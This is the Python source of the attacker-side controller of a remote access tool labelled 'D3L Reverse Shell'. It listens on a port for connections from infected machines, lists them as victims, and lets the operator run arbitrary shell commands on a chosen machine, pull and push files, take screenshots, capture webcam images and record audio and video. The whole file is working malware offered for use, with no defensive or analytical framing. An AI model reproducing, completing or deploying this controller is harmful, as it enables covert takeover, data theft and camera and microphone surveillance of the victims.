# Reverse Shell 
# Plane version 2.0
# Author: Edilmar Castones Lulab
# Attacker

import threading
import socket
import time
import requests
import json
import os
from queue import Queue

NUMBER_OF_THREADS  =  2
JOB_NUMBER         =  [1, 2]
queue              =  Queue() 
all_connections    =  []
all_addresses      =  []

def socket_create():
	try:
		global host
		global port
		global s
		host = ''
		port = 4278
		s = socket.socket()
	except socket.error as msg:
		print("Socket Creation Error: " + str(msg))

def socket_bind():
	try:
		global host
		global port
		global s
		print('\nBinding Socket to Port: ' + str(port))
		s.bind((host,port))
		s.listen(5)

	except socket.error as msg:
		print('Socket Binding Error: ' + str(msg))
		time.sleep(3)
		socket_bind()

def accept_connections():
	for c in all_connections:
		c.close()
	del all_connections[:]
	del all_addresses[:]

	while 1:
		try:
			conn, address = s.accept()
			conn.setblocking(1)
			all_connections.append(conn)
			all_addresses.append(address)
			print('\nConnection as Been Stablished: ' + address[0])
		except:
			print('Error Accepting Connections')

def start_turtle():
	time.sleep(3)
	while True:
		cmd = input('Exploit> ')
		if cmd == '':
			pass
		elif cmd == 'clear':
			os.system('cls')
		elif cmd == 'list':
			print()
			list_connections()
		elif cmd == 'restart':
			icon()
			print()
		elif 'select' in cmd:
			conn = get_target(cmd)
			if conn is not None:
				send_target_commands(conn)
		else:
			print('Command not recognized')

def list_connections():
	results = ''
	for i, conn in enumerate(all_connections):
		try:
			conn.send(str.encode(' '))
			conn.recv(20480)
		except:
			del all_connections[i]
			del all_addresses[i]
			continue
		results += '      ' + str(i) + '       ' + str(all_addresses[i][0]) + '      ' + str(all_addresses[i][1]) + '\n'
	print('--------=[  CONNECTED VICTIMS  ]=------------' + '\n' + results)

def get_target(cmd):
	try:
		target = cmd.replace('select ', '')
		target = int(target)
		conn = all_connections[target]

		conn.send(str.encode('connected_1284', 'utf-8'))
		client_response = str(conn.recv(20480), 'utf-8')

		print('You are now connected to ' + str(all_addresses[target][0]) + '\n')
		print(client_response, end='')
		return conn
	except:
		print('Not a valid selection')
		return None

def send_target_commands(conn):
	while True:
		try:
			cmd = input()
			if len(str.encode(cmd)) > 0:
				# Download File From Victim
				if cmd[0:8] == 'download':
					download(cmd,conn)
				# Upload File From Victim
				elif cmd[0:6] == 'upload':
					upload(cmd,conn)
				# Screenshot	
				elif cmd[0:10] == 'screenshot':
					screenshot(cmd,conn)
				# Camera
				elif cmd[0:6] == 'camera':
					camera(cmd,conn)
				# Voice Record
				elif cmd[0:9] == 'video_rec':
					video_record(cmd,conn)
				# Voice Record
				elif cmd[0:9] == 'voice_rec':
					voice_record(cmd,conn)
				# Clear Screen
				elif cmd == 'clear':
					clear(cmd,conn)
				# Quit Session
				elif cmd == 'quit':
					break
						
				else:
					# Send Other Commands
					conn.send(str.encode(cmd))
					client_response = str(conn.recv(9000000), 'utf-8')
					print(client_response, end='')

			if cmd == '':
				conn.send(str.encode('nosent_1486'))
				client_response = str(conn.recv(9000000), 'utf-8')
				print(client_response, end='')

		except Exception as msg:
			print('Connection was lost: ' + str(msg))
			break

def download(cmd,conn):
	file_Name = cmd[9:]
	conn.send(str.encode(cmd))
	client_response = str(conn.recv(20480), 'utf-8')

	if client_response == 'FILE FOUND':

		print()
		print('  [!] FILE FOUND')
		f = open(file_Name, 'wb')
		file_Size = str(conn.recv(1024), 'utf-8')
		time.sleep(1)

		print('  [*] File Name: ' + str(file_Name))
		print('  [*] File Size: ' + str(file_Size))
		print('  [!] Downloading...')

		data = conn.recv(int(20480))

		while not ('COMPLETE' in str(data)):
			f.write(data)
			data = conn.recv(20480)
		f.close()

		print('  [!] DOWNLOADING COMPLETE')
		print()
		conn.send(str.encode('DOWNLOAD COMPLETE', 'utf-8'))

	else:
		print()
		print('  [!] FILE NOT FOUND')
		print('  [*] Please Try Again')
		print()
	
	client_response = str(conn.recv(20480), 'utf-8')
	print(client_response, end='')

def upload(cmd,conn):
	file_Name = cmd[7:]
	if (os.path.exists(file_Name)):

		file_Size = os.path.getsize(file_Name)
		conn.send(str.encode(cmd))
		time.sleep(1)

		print()
		print('  [!] FILE FOUND')
		print('  [!] Uploading: ' + file_Name)
		print('  [*] File Size: ' + str(file_Size))
		print('  [!] Uploading...')
		conn.send(str.encode(str(file_Size), 'utf-8'))
		time.sleep(1)

		f = open(file_Name, 'rb')
		data = f.read(20480) 

		while data:
			conn.send(data)
			data = f.read(20480)
			
		time.sleep(1)
		conn.send(str.encode('COMPLETE'))
		f.close()

		client_response = str(conn.recv(20480), 'utf-8')
		if client_response == 'upload_complete_1243':
			print('  [!] UPLOADING COMPLETE')
			print()

	else:
		conn.send(str.encode('upload not found 59269164', 'utf-8'))
		print()
		print('  [!] FILE NOT FOUND')
		print('  [*] Please Try Again')
		print()

	client_response = str(conn.recv(20480), 'utf-8')
	print(client_response, end='')

def screenshot(cmd,conn):
	file_Name = cmd[11:]
	conn.send(str.encode(cmd))
	client_response = str(conn.recv(1024),'utf-8')

	if client_response == 'CAPTURING_SCREEN':

		print()
		print('  [!] SCREENSHOT')
		
		f = open(file_Name, 'wb')
		file_Size = str(conn.recv(1024), 'utf-8')

		print('  [*] File Name: ' + str(file_Name))
		print('  [*] File Size: ' + str(file_Size))
		print('  [!] Downloading Screenshot...')

		data = conn.recv(int(20480))

		while not ('COMPLETE' in str(data)):
			f.write(data)
			data = conn.recv(20480)
		f.close()

		print('  [!] SCREENSHOT COMPLETE')
		print()

		time.sleep(1)
		os.system(file_Name)
		conn.send(str.encode('SCREENSHOT COMPLETE', 'utf-8'))

	else:
		print()
		print('  [!] SCREENSHOT FAILED: ' + client_response )
		print('  [*] Please Try Again') 
		print()
	
	client_response = str(conn.recv(20480), 'utf-8')
	print(client_response, end='')

def camera(cmd,conn):

	file_Name = cmd[7:]

	print()
	print('  [!] CAMERA SNAP')
	print('  [*] File Name: ' + str(file_Name))

	conn.send(str.encode(cmd))
	client_response = str(conn.recv(20480), 'utf-8')

	if client_response == 'CAPTURING_CAMERA':

		f = open(file_Name, 'wb')
		file_Size = str(conn.recv(1024), 'utf-8')

		print('  [*] File Size: ' + str(file_Size))
		print('  [!] Downloading Camsnap...')

		data = conn.recv(int(20480))

		while not ('COMPLETE' in str(data)):
			f.write(data)
			data = conn.recv(20480)
		f.close()

		print('  [!] CAMSNAP COMPLETE')
		print()

		time.sleep(1)
		os.system(file_Name)
		conn.send(str.encode('CAMSNAP COMPLETE', 'utf-8'))

	else:
		print()
		print('  [!] CAMSNAP FAILED')
		print('  [*] Please Try Again') 
		print()
	
	client_response = str(conn.recv(20480),'utf-8')
	print(client_response, end='')

def voice_record(cmd,conn):
	file_Name = 'AudioRecord.wav'
	duration = cmd[10:]
	conn.send(str.encode(cmd))

	client_response = str(conn.recv(20480), 'utf-8')
	if client_response == 'VOICE_RECORDING':

		print()
		print('  [!] VOICE RECORD')
		print('  [!] Recording, Please wait for: ' + duration + 'sec')
		f = open(file_Name, 'wb')
		file_Size = str(conn.recv(1024), 'utf-8')

		print('  [*] File Name: ' + str(file_Name))
		print('  [*] File Size: ' + str(file_Size))
		print('  [!] Downloading Voice Record...')

		data = conn.recv(int(20480))

		while not ('COMPLETE' in str(data)):
			f.write(data)
			data = conn.recv(20480)
		f.close()

		print('  [!] DOWNLOADING VOICE RECORD COMPLETE')
		print()

		conn.send(str.encode('VOICE RECORD COMPLETE', 'utf-8'))

	else:
		print()
		print('  [!] VOICE RECORD FAILED: ' + client_response )
		print('  [*] Please Try Again') 
		print()
	
	client_response = str(conn.recv(20480), 'utf-8')
	print(client_response, end='')

def video_record(cmd,conn):
	file_Name = 'VideoRecord.wav'
	duration = cmd[10:]
	conn.send(str.encode(cmd))

	client_response = str(conn.recv(20480), 'utf-8')
	if client_response == 'VIDEO_RECORDING':

		print()
		print('  [!] VIDEO RECORD!!!')
		print('  [!] Recording, Please wait for: ' + duration + 'sec')
		f = open(file_Name, 'wb')
		file_Size = str(conn.recv(1024), 'utf-8')

		print('  [*] File Name: ' + str(file_Name))
		print('  [*] File Size: ' + str(file_Size))
		print('  [!] Downloading Video Record...')

		data = conn.recv(int(20480))

		while not ('COMPLETE' in str(data)):
			f.write(data)
			data = conn.recv(20480)
		f.close()

		print('  [!] DOWNLOADING VIDEO RECORD COMPLETE')
		print()

		conn.send(str.encode('VIDEO RECORD COMPLETE', 'utf-8'))

	else:
		print()
		print('  [!] VIDEO RECORD FAILED: ' + client_response )
		print('  [*] Please Try Again') 
		print()
	
	client_response = str(conn.recv(20480), 'utf-8')
	print(client_response, end='')

def clear(cmd,conn):
	conn.send(str.encode(cmd))
	os.system('cls')
	client_response = str(conn.recv(20480), 'utf-8')
	print(client_response, end='')

def create_workers():
	for _ in range(NUMBER_OF_THREADS):
		t = threading.Thread(target=work)
		t.daemon = True
		t.start()

def work():
	while True:
		x = queue.get()
		if x==1:
			socket_create()
			socket_bind()
			accept_connections()
		if x==2:
			start_turtle()
	
def create_jobs():
	for x in JOB_NUMBER:
		queue.put(x)
	queue.join()

def restart():
	icon()

def icon():
	os.system('cls')
	print()
	print('  DDDDDDDCDDD     33333333333     L                ')
	print('   DDD      DDD   33      3333    LL               ')
	print('   DDD       DDD  3        3333   LLL              ')
	print('   DDD       DDDD           3333  LLL              ')
	print('   DDD       DDDD      333333333  LLL              ')
	print('   DDD       DDDD           3333  LLL              ')
	print('   DDD       DDDD           3333  LLL        L     ')
	print('   DDD       DDD  3        3333   LLL        LL    ')
	print('   DDD      DDD   33      3333    LLL        LLL   ')
	print('  DDDDDDCDDDD     33333333333    LLLLLLLLLLLLLLL   ')
	print('  [--------------------------------------------]')
	print('  [--------==[[ D3L REVERSE SHELL ]]==---------]')
	print('  [--------------------------------------------]')

icon()
create_workers()
create_jobs()